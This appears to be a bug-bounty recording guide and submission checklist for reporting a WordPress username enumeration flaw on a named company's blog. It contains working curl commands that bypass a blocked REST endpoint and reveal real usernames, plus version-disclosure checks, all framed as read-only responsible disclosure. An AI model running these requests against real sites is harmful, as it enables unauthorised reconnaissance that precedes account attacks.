# Recording Guide — ELAN Submission #1 (WP Username Enumeration)

Beginner-friendly. Total time: ~10 minutes. You only need a terminal and a screen recorder.

## What you are proving

The WordPress blog at www.elanlimited.com/blogs leaks usernames ("sandeep", "ravi-elan") to anyone,
even though the site team already tried to block that (the normal /wp-json URL returns 404).
Your recording shows: blocked → bypassed → usernames revealed. That 3-step story is the whole report.

## Before recording (5 min)

1. Open a terminal and `cd` into `COMOHLO/ELAN/Proofs/`.
2. Run `./poc_user_enum_elan.sh --dry` once. You should see the 4 commands printed, nothing executed.
3. Make the script executable if needed: `chmod +x poc_user_enum_elan.sh`
4. Start your screen recorder:
   - **Spectacle (KDE):** open Spectacle → "Record" not available? Use OBS instead (steps below).
   - **OBS Studio:** add a "Screen Capture (XSHM)" source → select your monitor → Start Recording.
   - **Simple alternative:** GNOME: press `Ctrl+Alt+Shift+R` (built-in recorder), or `wf-recorder -f poc.mp4`.
5. Font size up (terminal `Ctrl` + `+`) so the HTTP codes are readable on the video.

## Recording script (do this in one take, ~60 seconds)

While recording, run — one line at a time, pausing 2-3 seconds after each so it's visible:

```
./poc_user_enum_elan.sh
```

Or manually, showing each step separately (recommended for the video):

```
# 1. Control: blocked
curl -s -o /dev/null -w '%{http_code}\n' "https://www.elanlimited.com/blogs/wp-json/wp/v2/users"
#    → shows 404

# 2. Bypass: usernames
curl -s "https://www.elanlimited.com/blogs/index.php?rest_route=/wp/v2/users&per_page=100"
#    → JSON with "slug":"sandeep" and "slug":"ravi-elan"

# 3. Author archive leak
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' "https://www.elanlimited.com/blogs/?author=1"
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' "https://www.elanlimited.com/blogs/?author=3"
#    → 301 -> .../author/sandeep/  and  .../author/ravi-elan/

# 4. Version disclosure (optional bonus)
curl -s -o /dev/null -w '%{http_code}\n' "https://www.elanlimited.com/blogs/readme.html"
#    → 200
```

Stop the recording. Save as `poc_user_enum_elan.mp4` (or .webm) in this Proofs folder.

## Com Olho submission form — field-by-field paste table

| Form field | What to paste |
|---|---|
| Title | Unauthenticated WordPress Username Enumeration on www.elanlimited.com/blogs via REST route bypass |
| Severity | P5 · Informational |
| Target / Asset | http://www.elanlimited.com (WordPress at /blogs/) |
| Vulnerability Type | Information Disclosure / Broken Access Control (CWE-200) |
| Description | Copy the **Description** section from [submission_1_wp_user_enum_draft.md](../submissions/submission_1_wp_user_enum_draft.md) |
| Steps to Reproduce | Copy the **Steps to Reproduce** section (4 curl commands, keep them as code blocks) |
| Impact | Copy the **Impact** section |
| Recommendation | Copy the **Recommendation** section (5 numbered items) |
| Proof of Concept | Attach the screen recording `poc_user_enum_elan.mp4` + optionally paste the curl outputs as text |
| Anything else? | "Testing was read-only: 6 unauthenticated GET requests total. No accounts, data, or content accessed or modified. xmlrpc.php correctly returns 403 — only the two described vectors remain open." |

## Etiquette checklist (tick before clicking Submit)

- [ ] Only www.elanlimited.com appears in the video (no other subdomains/IPs)
- [ ] No login attempts made — only GET requests
- [ ] Report is submitted alone, not batched with other findings (program rule: sequential reports)
- [ ] Severity claimed honestly as P5
